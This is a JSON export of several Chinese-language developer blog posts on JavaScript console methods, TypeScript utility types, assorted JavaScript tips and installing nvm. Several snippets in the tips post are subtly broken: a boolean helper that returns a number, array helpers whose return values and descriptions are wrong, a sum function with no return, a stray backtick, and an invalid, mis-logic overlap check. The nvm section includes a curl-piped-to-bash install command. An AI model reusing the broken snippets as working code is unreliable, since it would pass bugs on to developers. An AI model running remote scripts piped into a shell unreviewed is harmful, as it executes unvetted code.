console.time(\u0026#39;迴圈處理時間\u0026#39;); for (let index = 0; index \u0026lt; people.length; index++) { const element = people[index]; console.log(element); } console.timeEnd(\u0026#39;迴圈處理時間\u0026#39;); 在起訖中分別加入 time() 以及 timeEnd()，執行程式碼後就可以獲得處理的結果。\nconsole.dir()：以物件的形式呈現資料 1 2 3 // HTML \u0026lt;p\u0026gt;推薦的 Console 語法\u0026lt;/p\u0026gt; const p = document.querySelector(\u0026#39;p\u0026#39;); console.log(p); 當使用 console.log() 查看 DOM 元素，並想了解其中可用的方法或屬性時…，它可能會出現如下帶點失望的標籤，並且心裡默罵：\n要這個幹嘛啦 要知道的是物件屬性、屬性 這時候需要的是 console.dir()，你會發現另一個新世界，原本的 DOM 元素被改為物件的形式呈現，你可以輕鬆展開此物件，並檢視裡面有哪些可用屬性。\n1 2 const p = document.querySelector(\u0026#39;p\u0026#39;); console.dir(p); 展開的 P 元素，包含其中所有的屬性（這在操作 DOM 時極為好用）\nconsole.error() 寫程式有錯誤是難免的，但是如果是錯誤，卻沒有明確的提示導致沒有被發現問題，就失去提示的意義了，如果想讓 Console 的內容更加醒目，可以使用 console.error() 使訊息在 Console 介面中以錯誤的形式呈現。\n1 console.error(`${Ming.name} 你完蛋了`); 當運用在一般文字訊息上時，也可以展開訊息並說明錯誤來源自哪一段程式碼。\n在 AJAX 的未確認狀態中，也會使用 console.error 來呈現錯誤的回饋訊息，以下範例刻意將 API 路徑調整成錯誤的，並透過 console.error() 來將錯誤的資訊呈現在 Console 介面中\n1 2 3 4 5 6 // Error axios.get(\u0026#39;https://randomuser.me/apis\u0026#39;) .then((res) =\u0026gt; console.log(res)) .catch((error) =\u0026gt; { console.error(\u0026#39;待誌大條啦: \u0026#39;, error.response) }) console.warn() 錯誤太突兀了嗎？如果是自行開發的函式庫，已經透過各種形式避免程式碼出錯，但還是想把有錯誤的訊息給予開發者知道，那麼則可以使用 console.warn()。\n1 2 3 4 5 6 7 8 9 10 11 12 // Warning /*** * 超精美函式庫 💖 * @param {number} num 純數值 * @param {string} text 請傳入字串 */ function superMagicLibrary(num, text) { if (typeof num !== \u0026#39;number\u0026#39;) { console.warn(\u0026#39;尊重一下好嗎，請傳入純數值\u0026#39;) } } superMagicLibrary(\u0026#39;字串\u0026#39;); 函式庫中大多會避免已知的錯誤，如果要友善的給予回饋，可以使用 warn() 代替 error() 提醒開發者更好的做法。\nconsole.clear() 如果覺得 Console 介面已經充滿了許多不必要的資訊，想要專注於當前開發的程式碼，那麼可以加入 console.clear()。\n畫面中會出現 Console was cleared 的字眼\n此語法亦可在 Console 介面中直接輸入，會直接清除當下的所有資訊內容。\n不過請慎用此方法，如果隨意插入 console.clear() 在不同的檔案中，不知情的夥伴一定會在開發中卡很久，可能發生的情境有…：\n奇怪，我寫的 Code 怎麼都沒顯示在 Console 編譯器壞了嗎？怎麼好像沒有運作 我的 Chrome 怪怪的 還有哪些方法你也常用，但沒有介紹到的呢？歡迎在底下留言區留言喔\n","date":"2022-11-03T00:00:00Z","image":"https://live.staticflickr.com/65535/52473860621_0ede00e99a_o.jpg","permalink":"https://wayneblog.ga/2022-11-03/js-8-console-tricks/","title":"8 招 JavaScript Console 運用技巧，讓你除錯更高效"},{"content":" 參考網站\n很多人在平時的開發中使用到了 TypeScript，但是可能只是單純使用了一些基本的類型，但很多人不知道其實 TypeScript 自帶了很多非常方便的方法，接下來我就結合例子，給大家介紹一下這些很方便的方法。\nTypeScript 自帶的方法 Partial 作用 Partial 將類型的屬性變成可選\n例子 假如我現在有個 interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } 有一天，我想把 IUser 身上的屬性都變成可選的，那我可能會再寫一個 interface\n1 2 3 4 5 interface IUser2 { name?: string; age?: number; gender?: number; } 但是如果屬性多了的話，我們又得寫很多額外的代碼，這個時候就可以直接用 Partial\n1 2 3 4 5 6 7 8 9 type IUser2 = Partial\u0026lt;IUser1\u0026gt; // 等同於 interface IUser2 { name?: string; age?: number; gender?: number; } 原理 1 2 3 type Partial\u0026lt;T\u0026gt; = { [P in keyof T]?: T[P]; }; Required 作用 Required 將類型的屬性變成必選\n例子 假如我現在有個 interface\n1 2 3 4 5 interface IUser1 { name: string; age?: number; gender?: number; } 可以看到有一些屬性是可選的，但是突然有一天，我想讓所有屬性變成必選我會再寫一個 interface\n1 2 3 4 5 interface IUser2 { name: string; age: number; gender: number } 但如果屬性多了的話，又要寫很多額外的代碼，這時候 Required 就派上用場了\n1 2 3 4 5 6 7 8 9 type IUser2 = Required\u0026lt;IUser1\u0026gt; // 等同於 interface IUser2 { name: string; age: number; gender: number } 原理 1 2 3 type Required\u0026lt;T\u0026gt; = { [P in keyof T]-?: T[P] }; Pick 作用 Pick 從某個類型中挑出一些屬性出來\n例子 假如我現在有個 interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } 有一天我想要寫一個新 interface，它只擁有 age、gender 這兩個屬性，那我會重新寫一個 interface\n1 2 3 4 interface IUser2 { age: number; gender: number; } 但其實使用 Pick 非常方便去做這件事\n1 2 3 4 5 6 7 8 type IUser2 = Pick\u0026lt;IUser1, \u0026#39;age\u0026#39; | \u0026#39;gender\u0026#39;\u0026gt; // 等同於 interface IUser2 { age: number; gender: number; } 原理 1 2 3 type Pick\u0026lt;T, K extends keyof T\u0026gt; = { [P in K]: T[P]; }; Omit 作用 Omit\u0026lt;T, K extends keyof any\u0026gt; 的作用是使用 T 類型中除了 K 類型的所有屬性，來構造一個新的類型。\n例子 假如我現在有個 interface\n1 2 3 4 5 interface IUser1 { name: string; age: number; gender: number; } 有一天我想要寫一個新 interface，它只擁有 age、gender 這兩個屬性，那我會重新寫一個 interface\n1 2 3 4 interface IUser2 { age: number; gender: number; } 但其實使用 Omit 非常方便去做這件事\n1 2 3 4 5 6 7 8 type IUser2 = Omit\u0026lt;IUser1, \u0026#39;name\u0026#39;\u0026gt; // 等同於 interface IUser2 { age: number; gender: number; } 原理 1 type Omit\u0026lt;T, K extends keyof any\u0026gt; = Pick\u0026lt;T, Exclude\u0026lt;keyof T, K\u0026gt;\u0026gt;; NonNullable 作用 NonNullable 的作用是用來過濾類型中的 null 及 undefined 類型。\n例子 1 2 3 4 5 // string | number type T0 = NonNullable\u0026lt;string | number | undefined\u0026gt;; // string[] type T1 = NonNullable\u0026lt;string[] | null | undefined\u0026gt;; 原理 1 type NonNullable\u0026lt;T\u0026gt; = T extends null | undefined ? never : T; ReturnType 作用 ReturnType 的作用是用來得到一個函數的返回值類型。\n例子 假如我想定義一個變量來接受一個函數的返回值，但是不知道怎麼定義這個變量的類型，這個時候可以用 ReturnType\n1 2 3 4 5 6 type Func = (value: number) =\u0026gt; string; let str: ReturnType\u0026lt;Func\u0026gt;; const fun: Func = (value: number) =\u0026gt; String(value) str = fun(1) 原理 1 2 type ReturnType\u0026lt;T extends (...args: any[]) =\u0026gt; any\u0026gt; = T extends (...args: any[]) =\u0026gt; infer R ? R : any; Exclude 作用 Exclude\u0026lt;T, U\u0026gt; 的作用是將某個類型中屬於另一個的類型移除掉。\n例子 1 2 3 4 5 type T0 = Exclude\u0026lt;\u0026#34;a\u0026#34; | \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34;\u0026gt;; // \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34; type T1 = Exclude\u0026lt;\u0026#34;a\u0026#34; | \u0026#34;b\u0026#34; | \u0026#34;c\u0026#34;, \u0026#34;a\u0026#34; | \u0026#34;b\u0026#34;\u0026gt;; // \u0026#34;c\u0026#34; type T2 = Exclude\u0026lt;string | number | (() =\u0026gt; void), Function\u0026gt;; // string | number 原理 1 type Exclude\u0026lt;T, U\u0026gt; = T extends U ? never : T; Record 作用 Record\u0026lt;K extends keyof any, T\u0026gt; 的作用是將 K 中所有的屬性的值轉化爲 T 類型。\n例子 1 2 3 4 5 6 7 8 9 10 11 interface PageInfo { title: string; } type Page = \u0026#34;home\u0026#34; | \u0026#34;about\u0026#34; | \u0026#34;contact\u0026#34;; const x: Record\u0026lt;Page, PageInfo\u0026gt; = { about: { title: \u0026#34;about\u0026#34; }, contact: { title: \u0026#34;contact\u0026#34; }, home: { title: \u0026#34;home\u0026#34; }, }; 原理 1 2 3 type Record\u0026lt;K extends keyof any, T\u0026gt; = { [P in K]: T; }; Readonly 作用 Readonly 的作用是將某個類型所有屬性變爲只讀屬性，也就意味着這些屬性不能被重新賦值。\n例子 1 2 3 4 5 6 7 8 9 10 interface Todo { title: string; } const todo: Readonly\u0026lt;Todo\u0026gt; = { title: \u0026#34;Delete inactive users\u0026#34; }; todo.title = \u0026#34;Hello\u0026#34;; // Error: cannot reassign a readonly property 原理 1 2 3 type Readonly\u0026lt;T\u0026gt; = { readonly [P in keyof T]: T[P]; }; ","date":"2022-10-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52459954880_4228a13922_o.png","permalink":"https://wayneblog.ga/2022-10-28/ts-useful-tricks/","title":"TypeScript 的實用方法！大家一定要學會啊！"},{"content":" 參考網站\n參考網站\n最近重溫了一遍紅寶書，發現一些比較好玩的寫法，很多東西日常都在用，但是發現還會有不一樣的寫法, 結合一些日常工作中使用的方法，爲大家總結一篇日常經常使用可能還不知道的點，希望對你能有所幫助。\n一行代碼完成結構加賦值 我們日常經常使用結構賦值，一般都是先結構，再賦值，當然我們也可以一行就完成解構加賦值操作，看起來非常簡化，當然可讀性你懂得！\n1 2 3 4 5 let people = { name: null, age: null }; let result = { name: \u0026#39;張三\u0026#39;, age: 16 }; ({ name: people.name, age: people.age} = result); console.log(people) // {\u0026#34;name\u0026#34;:\u0026#34;張三\u0026#34;,\u0026#34;age\u0026#34;:16} 對基礎數據類型進行解構 日常中我們應該用不到這樣的場景，但是實際上我們也可以對基礎數據類型解構。\n1 2 const {length : a} = \u0026#39;1234\u0026#39;; console.log(a) // 4 對數組解構快速拿到最後一項值 實際上我們是可以對數組解構賦值拿到 length 屬性的，通過這個特性也可以做更多的事情。\n1 2 3 4 5 const arr = [1, 2, 3]; const { 0: first, length, [length - 1]: last } = arr; first; // 1 last; // 3 length; // 3 將下標轉爲中文零一二三\u0026hellip; 日常可能有的列表我們需要將對應的 012345 轉爲中文的一、二、三、四、五\u0026hellip;，在老的項目看到還有通過自己手動定義很多行這樣的寫法，於是寫了一個這樣的方法轉換\n1 2 3 4 5 6 export function transfromNumber(number){ const INDEX_MAP = [\u0026#39;零\u0026#39;，\u0026#39;一\u0026#39;.....] if(!number) return if(number === 10) return INDEX_MAP[number] return [...number.toString()].reduce( (pre, cur) =\u0026gt; pre + INDEX_MAP[cur] , \u0026#39;\u0026#39; ) } 判斷整數的不同方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* 1. 任何整數都會被1整除，即餘數是0。利用這個規則來判斷是否是整數。但是對字符串不準確 */ function isInteger(obj) { return obj % 1 === 0 } /* 1. 添加一個是數字的判斷 */ function isInteger(obj) { return typeof obj === \u0026#39;number\u0026#39; \u0026amp;\u0026amp; obj % 1 === 0 } /* 2. 使用Math.round、Math.ceil、Math.floor判斷 整數取整後還是等於自己。利用這個特性來判斷是否是整數*/ function isInteger(obj) { return Math.floor(obj) === obj } /* 3. 通過parseInt判斷 某些場景不準確 */ function isInteger(obj) { return parseInt(obj, 10) === obj } /* 4. 通過位運算符*/ function isInteger(obj) { return (obj | 0) === obj } /* 5.ES6提供了Number.isInteger */ 通過 css 檢測系統的主題色從而全局修改樣式 @media 的屬性 prefers-color-scheme 就可以知道當前的系統主題，當然使用前需要查查兼容性。\n1 2 @media (prefers-color-scheme: dark) { //... } @media (prefers-color-scheme: light) { //... } javascript 也可以輕鬆做到\n1 2 3 4 5 6 7 8 window.addEventListener(\u0026#39;theme-mode\u0026#39;, event =\u0026gt;{ if(event.mode == \u0026#39;dark\u0026#39;){} if(event.mode == \u0026#39;light\u0026#39;){} }) window.matchMedia(\u0026#39;(prefers-color-scheme: dark)\u0026#39;) .addEventListener(\u0026#39;change\u0026#39;, event =\u0026gt; { if (event.matches) {} // dark mode }) 數組隨機打亂順序 通過 0.5-Math.random() 得到一個隨機數，再通過兩次 sort 排序打亂的更徹底, 但是這個方法實際上並不夠隨機，如果是企業級運用，建議使用第二種洗牌算法。\n1 2 3 function shuffle(arr) { return arr.sort(() =\u0026gt; 0.5 - Math.random()). sort(() =\u0026gt; 0.5 - Math.random()); } 1 2 3 4 5 6 7 function shuffle(arr) { for (let i = arr.length - 1; i \u0026gt; 0; i--) { const randomIndex = Math.floor(Math.random() * (i + 1)) ;[arr[i], arr[randomIndex]] = [arr[randomIndex], arr[i]] } return arr } 隨機獲取一個 Boolean 值 和上個原理相同，通過隨機數獲取，Math.random() 的區間是 0-0.99，用 0.5 在中間百分之五十的概率。\n1 2 3 function randomBool() { return 0.5 - Math.random() } 把數組最後一項移到第一項 1 2 3 function (arr){ return arr.push(arr.shift()); } 把數組的第一項放到最後一項 1 2 3 function(arr){ return arr.unshift(arr.pop()); } 利用 set 數組去重 1 2 3 function uniqueArr(arr){ return [...new Set(arr)] } dom 節點平滑滾動到可視區域、頂部、底部 原生的 scrollTo 方法沒有動畫，類似於錨點跳轉，比較生硬，可以通過這個方法會自帶平滑的過度效果。\n1 2 3 4 5 6 7 8 9 10 function scrollTo(element) { // 頂部 element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;start\u0026#34; }) // 底部 element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;end\u0026#34; }) // 可視區域 element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;}) } 獲取隨機顏色 日常我們經常會需要獲取一個隨機顏色，通過隨機數即可完成。\n1 2 3 function getRandomColor(){ return `#${Math.floor(Math.random() * 0xffffff) .toString(16)}`; } 檢測是否爲空對象 通過使用 ES6 的 Reflect 靜態方法判斷他的長度就可以判斷是否是空數組了，也可以通過 Object.keys() 來判斷。\n1 2 3 function isEmpty(obj){ return Reflect.ownKeys(obj).length === 0 \u0026amp;\u0026amp; obj.constructor === Object; } Boolean 轉換 一些場景下我們會將 boolean 值定義爲場景，但是在 js 中非空的字符串都會被認爲是 true。\n1 2 3 4 5 6 7 function toBoolean(value, truthyValues = [\u0026#39;true\u0026#39;]){ const normalizedValue = String(value).toLowerCase().trim(); return truthyValues.includes(normalizedValue); } toBoolean(\u0026#39;TRUE\u0026#39;); // true toBoolean(\u0026#39;FALSE\u0026#39;); // false toBoolean(\u0026#39;YES\u0026#39;, [\u0026#39;yes\u0026#39;]); // true 各種數組複製方法 數組克隆的方法其實特別多了，看看有沒有你沒見過的！\n1 2 3 4 5 6 7 const clone = (arr) =\u0026gt; arr.slice(0); const clone = (arr) =\u0026gt; [...arr]; const clone = (arr) =\u0026gt; Array.from(arr); const clone = (arr) =\u0026gt; arr.map((x) =\u0026gt; x); const clone = (arr) =\u0026gt; JSON.parse(JSON.stringify(arr)); const clone = (arr) =\u0026gt; arr.concat([]); const clone = (arr) =\u0026gt; structuredClone(arr); 比較兩個時間大小 通過調用 getTime 獲取時間戳比較就可以了。\n1 2 3 function compare(a, b){ return a.getTime() \u0026gt; b.getTime(); } 計算兩個時間之間的月份差異 1 2 3 function monthDiff(startDate, endDate){ return Math.max(0, (endDate.getFullYear() - startDate.getFullYear()) * 12 - startDate.getMonth() + endDate.getMonth()); } 一步驟從時間中提取年月日時分秒 時間格式化輕鬆解決，一步驟獲取到年月日時分秒毫秒，由於 toISOString 會丟失時區，導致時間差八小時，所以在格式化之前我們加上八個小時時間即可。\n1 2 3 4 5 6 function extract(date){ const d = new Date(new Date(date).getTime() + 8*3600*1000); return new Date(d).toISOString().split(/[^0-9]/).slice(0, -1); } console.log(extract(new Date())) // [\u0026#39;2022\u0026#39;, \u0026#39;09\u0026#39;, \u0026#39;19\u0026#39;, \u0026#39;18\u0026#39;, \u0026#39;06\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;187\u0026#39;] 判斷一個參數是不是函數 有時候我們的方法需要傳入一個函數回調，但是需要檢測其類型，我們可以通過 Object 的原型方法去檢測，當然這個方法可以準確檢測任何類型。\n1 2 3 function isFunction(v){ return [\u0026#39;[object Function]\u0026#39;, \u0026#39;[object GeneratorFunction]\u0026#39;, \u0026#39;[object AsyncFunction]\u0026#39;, \u0026#39;[object Promise]\u0026#39;].includes(Object.prototype.toString.call(v)); } 計算兩個座標之間的距離 1 2 3 function distance(p1, p2){ return `Math.sqrt(Math.pow(p2.x - p1.x, 2) + Math.pow(p2.y - p1.y, 2)); } 檢測兩個 dom 節點是否覆蓋重疊 有些場景下我們需要判斷 dom 是否發生碰撞了或者重疊了，我們可以通過 getBoundingClientRect 獲取到 dom 的 x1、y1、x2、y2 座標然後進行座標比對即可判斷出來。\n1 2 3 function overlaps = (a, b) { return (a.x1 \u0026lt; b.x2 \u0026amp;\u0026amp; b.x1 \u0026lt; a.x2) || (a.y1 \u0026lt; b.y2 \u0026amp;\u0026amp; b.y1 \u0026lt; a.y2); } 判斷是否是 Nodejs 環境 前端的日常開發是離不開 nodejs 的，通過判斷全局環境來檢測是否是 nodejs 環境。\n1 2 3 function isNode(){ return typeof process !== \u0026#39;undefined\u0026#39; \u0026amp;\u0026amp; process.versions != null \u0026amp;\u0026amp; process.versions.node != null; } 參數求和 之前看到有通過函數柯理化形式來求和的，通過 reduce 一行即可。\n1 2 3 function sum(...args){ args.reduce((a, b) =\u0026gt; a + b); } ","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52457807569_15f64548d9_o.jpg","permalink":"https://wayneblog.ga/2022-10-27/js-30-keypoints/","title":"30 個 Javascript 知識點總結，總有你不會的！"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n參考網站\nnvm 是 Node.js 的版本管理器 (version manager)，可在同一台主機上安裝多個版本的 Node.js 環境，因為不同專案可能會使用不同的 Node.js 版本，那就需要透過一個版本管理器來切換不同的 Node.js 版本。\n安裝 NVM 接下來到 NVM 的 GitHub 儲存庫下載，無論你是 Windows、MacOS、Unix 系統都有對應的安裝方式。\nWindows NVM for Windows 有提供安裝工具，下載後照著安裝精靈依序完成即可運作，下載連結。\n請選擇 nvm-setup 下載並安裝\n下載後依循著安裝精靈即可完成。\n完成後，打開「命令提示字元」可以試著輸入 nvm，如果看到類似以下畫面就算是完成了。\nMacOS MacOS 則是使用指令進行安裝，打開「終端機」或自行安裝的「iTerm」等工具，輸入以下指令即可開始安裝，（更多版本連結）。\n1 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash 安裝後預期會顯示以下片段及算安裝完成，而此時如果你有安裝其它指令工具，有可能會發生輸入 nvm 無法呼叫的狀況（例如：zsh: command not found: nvm）。\n接下來可以在你所使用的命令設定檔案加入以下片段程式碼，以下提供 bash、zsh 的說明，兩者依據環境選擇其一即可：\nbash(預設) zsh bash 預設的情況下，MacOS 中可能沒有任何一個指令設定檔案，此時可以使用 touch ~/.bash_profile 新增一個文字檔案在根目錄上，接下來回到資料根目錄可以找到 .bash_profile，沒看到的話代表未開啟隱藏檔案顯示，可以按下 Command + Shift+ . 顯示。\n接下來使用任何文字編輯器打開該檔案，並加入以下程式碼存檔即可。\n1 2 3 export NVM_DIR=\u0026#34;$HOME/.nvm\u0026#34; [ -s \u0026#34;$NVM_DIR/nvm.sh\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/nvm.sh\u0026#34; # This loads nvm [ -s \u0026#34;$NVM_DIR/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/bash_completion\u0026#34; # This loads nvm bash_completion zsh 可以打開 .zshrc 加入以下片段後重啟（注意：.zshrc 通常在使用者根目錄下並且為隱藏檔，找到後使用任何文字編輯器打開編輯）。\n1 2 3 export NVM_DIR=\u0026#34;$HOME/.nvm\u0026#34; [ -s \u0026#34;$NVM_DIR/nvm.sh\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/nvm.sh\u0026#34; # This loads nvm [ -s \u0026#34;$NVM_DIR/bash_completion\u0026#34; ] \u0026amp;\u0026amp; \\. \u0026#34;$NVM_DIR/bash_completion\u0026#34; # This loads nvm bash_completion 設定完成以後，按下 nvm 就會跳出如下圖就算完成了。\n注意：\n使用 nvm 時，不需要 sudo 即可使用 npm -g 全域安裝模組，所以與其執行 sudo npm i -g，不如執行 npm i -g 若你有 ~/.npmrc，請確保裡面不包含任何 prefix 的設定 (因為與 nvm 不相容) 你可以 (但不應該) 保留以前在 \u0026ldquo;系統\u0026rdquo; 安裝的 Node.js，但 nvm 只對你的使用者帳戶 (用於安裝 nvm 的使用者帳戶) 可用。可能會導致版本不 match，因為其他使用者會使用 /usr/local/lib/node_modules/*，而使用者帳戶會使用 ~/.nvm/versions/node/vX.X.X/lib/node_modules/* 常用的 NVM 指令 直接輸入 nvm 及可以看到所有的指令列表，在此僅列出最常見的幾個指令（基本上常用的只有兩三個，剩下幾個只要認識即可）\nversion：確認 NVM 是否安裝成功 (alias：v) Usage： 1 2 3 nvm version # or nvm v 查看 NVM 的版本 1 2 $ nvm v 1.1.9 install：利用 NVM 安裝 Node.js Usage： 1 2 3 4 5 6 nvm install # or # {version} 欲安裝的 Node.js 版本 # {arch} 欲安裝的 system arch：32、64、\u0026#34;all\u0026#34; (預設為當前系統) nvm install \u0026lt;version\u0026gt; [arch] 安裝 NVM 後，其實還沒安裝 Node 環境：\n1 2 $ node zsh: command not found: node 如果執行下面指令，會提醒你需要執行 install 指令才能安裝 Node.js：\n1 2 3 4 $ nvm use node N/A: version \u0026#34;node -\u0026gt; N/A\u0026#34; is not yet installed. You need to run \u0026#34;nvm install node\u0026#34; to install it before using it. 安裝最新版的 Node.js：\n1 2 3 4 5 6 7 8 $ nvm install node Downloading and installing node v12.8.1... Downloading https://nodejs.org/dist/v12.8.1/node-v12.8.1-linux-x64.tar.xz... #################################################################################################### 100.0% Computing checksum with sha256sum Checksums matched! Now using node v12.8.1 (npm v6.10.2) Creating default alias: default -\u0026gt; node (-\u0026gt; v12.8.1) 如果要指定安裝版本，可以直接指定版本號 1 $ nvm install 16.18.0 安裝的第一個版本的 Node.js 會成為 nvm 的預設版本，新的 shell 就會以預設版本的 Node.js 來使用 (例如：nvm alias default)。\n查看目前安裝 Node.js 的版本：\n1 2 $ node -v v16.18.0 uninstall：利用 NVM 解除安裝指定的 Node.js 版本 Usage： 1 nvm uninstall \u0026lt;version\u0026gt; list：查看可用的安裝版本 (alias：ls) Usage： 1 2 3 nvm list # or nvm ls nvm list：查看已安裝的版本 nvm list installed：查看已安裝的版本 nvm list available：查看遠端可安裝的版本 查看目前 Node.js 有哪些可用版本可安裝 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ nvm ls available | CURRENT | LTS | OLD STABLE | OLD UNSTABLE | |--------------|--------------|--------------|--------------| | 19.0.0 | 18.12.0 | 0.12.18 | 0.11.16 | | 18.11.0 | 16.18.0 | 0.12.17 | 0.11.15 | | 18.10.0 | 16.17.1 | 0.12.16 | 0.11.14 | | 18.9.1 | 16.17.0 | 0.12.15 | 0.11.13 | | 18.9.0 | 16.16.0 | 0.12.14 | 0.11.12 | | 18.8.0 | 16.15.1 | 0.12.13 | 0.11.11 | | 18.7.0 | 16.15.0 | 0.12.12 | 0.11.10 | | 18.6.0 | 16.14.2 | 0.12.11 | 0.11.9 | | 18.5.0 | 16.14.1 | 0.12.10 | 0.11.8 | | 18.4.0 | 16.14.0 | 0.12.9 | 0.11.7 | | 18.3.0 | 16.13.2 | 0.12.8 | 0.11.6 | | 18.2.0 | 16.13.1 | 0.12.7 | 0.11.5 | | 18.1.0 | 16.13.0 | 0.12.6 | 0.11.4 | | 18.0.0 | 14.20.1 | 0.12.5 | 0.11.3 | | 17.9.1 | 14.20.0 | 0.12.4 | 0.11.2 | | 17.9.0 | 14.19.3 | 0.12.3 | 0.11.1 | | 17.8.0 | 14.19.2 | 0.12.2 | 0.11.0 | | 17.7.2 | 14.19.1 | 0.12.1 | 0.9.12 | | 17.7.1 | 14.19.0 | 0.12.0 | 0.9.11 | | 17.7.0 | 14.18.3 | 0.10.48 | 0.9.10 | 通常會選擇安裝 LTS (Long-term support，長期支援) 版\n查看目前已安裝的版本 1 2 3 $ nvm ls * 16.18.0 (Currently using 64-bit executable) 14.18.0 use：切換 Node.js 版本 Usage： 1 2 3 4 5 6 nvm use # or # {version} 欲切換的 Node.js 版本 # {arch} 欲切換的 system arch：32、64、\u0026#34;all\u0026#34; (預設為當前系統) nvm use \u0026lt;version\u0026gt; [arch] 如果要使用 nvm 切換正在使用的 Node.js 版本，可用 use 指令 1 nvm use v16.18.0 如果切換的目標版本還沒安裝，nvm 會提醒你要安裝：\n1 2 $ nvm use v14.18.0 node v14.18.0 (64-bit) is not installed. 透過 nvm 安裝 Node.js 時，nvm 會將不同的 Node.js 版本儲存在 ~/.nvm/versions/node/vX.X.X，然後再修改 $PATH，將指定版本的 Node.js 路徑加入：\n1 2 3 4 5 6 7 8 9 10 $ nvm current v10.16.3 $ echo $PATH /home/titan/.nvm/versions/node/v10.16.3/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $ use v12.13.1 $ nvm current v12.13.1 $ echo $PATH /home/titan/.nvm/versions/node/v12.13.1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 在 nvm 的各個 Node.js 版本安裝的全域套件都會在各自版本的目錄內安裝，所以在切換至新安裝的 Node.js 版本後需要重新安裝，也因為如此，不同版本間的套件就不會有衝突問題。\ncurrent：查看目前使用的版本 Usage： 1 nvm current 如果忘記自己切換到哪個版本，可以用 current 指令 1 2 $ nvm current v16.18.0 run：直接執行 Node.js (NVM 1.1.9版已拔除) 如果要直接執行 Node.js，可以使用下面指令 1 2 3 4 5 $ nvm run node Running node v16.18.0 (npm v8.19.2) Welcome to Node.js v16.18.0. Type \u0026#34;.help\u0026#34; for more information. \u0026gt; exec：指定要執行的 Node.js 版本 (NVM 1.1.9版已拔除) 1 2 3 4 5 $ nvm exec 12.8.1 node Running node v12.8.1 (npm v6.10.2) Welcome to Node.js v12.8.1. Type \u0026#34;.help\u0026#34; for more information. \u0026gt; which：察看 Node.js 的安裝路徑 (NVM 1.1.9版已拔除) 執行下面指令可以查看特定版本的 Node.js 的安裝路徑 1 2 $ nvm which 12.8.1 /home/titan/.nvm/versions/node/v12.8.1/bin/node alias：查看別名、設定別名 Usage： 1 2 3 4 5 6 7 8 9 10 11 12 $ nvm alias default -\u0026gt; v10.16.3 node -\u0026gt; stable (-\u0026gt; v12.8.1) (default) stable -\u0026gt; 12.8 (-\u0026gt; v12.8.1) (default) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) lts/* -\u0026gt; lts/erbium (-\u0026gt; N/A) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.16.2 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.17.0 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.13.0 (-\u0026gt; N/A) 如下圖有些版本的文字是紅色或是顯示 N/A，就代表該版本未在電腦安裝 預設 alias 可以取代版本號 node：安裝最新版的 Node.js iojs：安裝最新版的 io.js stable：此 alias 已棄用，僅適用於 v0.12 以及更舊版，目前改為 node alias unstable：此 alias 為 v0.11，最後一個 “unstable” (不穩定) Node release，在 v1.0 之後的版本都是穩定版 (in SemVer, versions communicate breakage, not stability) 可在下面這些指令使用以上預設別名：\nnvm install nvm use nvm run nvm exec nvm which … 等 設定別名 1 2 $ nvm alias v16-test v16.18.0 v16-test -\u0026gt; v16.18.0 接著用 nvm alias 指令就會看到剛剛新增的別名所對應的 Node.js 版本 1 2 3 4 5 6 7 8 9 10 11 12 13 $ nvm alias v16-test -\u0026gt; v10.15.3 default -\u0026gt; v10.16.3 node -\u0026gt; stable (-\u0026gt; v12.8.1) (default) stable -\u0026gt; 12.8 (-\u0026gt; v12.8.1) (default) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) lts/* -\u0026gt; lts/erbium (-\u0026gt; N/A) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.16.2 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.17.0 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.13.0 (-\u0026gt; N/A) 常見錯誤原因 報錯 exit status 1(或 exit status 5) 問題 出現 exit status 1 存取被拒 或 exit status 5 存取被拒，需要用管理員身分打開 cmd 命令列工具，再執行 nvm use \u0026lt;version\u0026gt; 即可。\n報錯 exit status 145 問題 這個問題可以在 github nvm-windows 下找到答案，nvm 安裝的時候有兩個安裝目錄，一個是 nvm 安裝目錄，一個是 nodejs 安裝目錄，這兩個安裝目錄名不能出現空格或中文，但是 nodejs 默認安裝目錄是 C:\\Program Files\\nodejs，這個目錄中間有空格，需要我們自定義一個安裝目錄，即可解決這個問題。\nBONUS：永遠以系統管理者身份執行 每次都要使用「以系統管理者身份執行」來開啟終端機是真的滿麻煩的，所以你其實可以針對應用程式永遠「以系統管理者身份執行」，首先點你要永遠執行的程式右鍵選內容\n點選下方進階\n將「以系統管理員身份執行」打勾\n搞定，之後使用捷徑打開 cmd 時，皆為「以系統管理員身份執行」\n總結 nvm 指令整理\n指令 功能 nvm versionnvm v 查看 nvm 版本 nvm install \u0026lt;version\u0026gt; 安裝指定 \u0026lt;version\u0026gt; 